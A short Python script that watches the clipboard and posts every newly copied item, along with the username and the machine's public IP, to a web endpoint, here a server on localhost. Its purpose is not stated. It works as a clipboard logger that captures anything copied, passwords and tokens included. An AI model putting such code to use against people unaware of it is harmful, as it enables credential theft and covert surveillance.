import pyperclip
import requests
import getpass

user = getpass.getuser()
public_ip = requests.get('http://api.ipify.org').text

while pyperclip.paste() != 'pyperclip_stop':
    pyperclip.waitForNewPaste()
    requests.post('http://127.0.0.1:8000/api/v1/add/', data={'user': user, 'ip': public_ip, 'data': pyperclip.paste()})
    # print(pyperclip.paste())
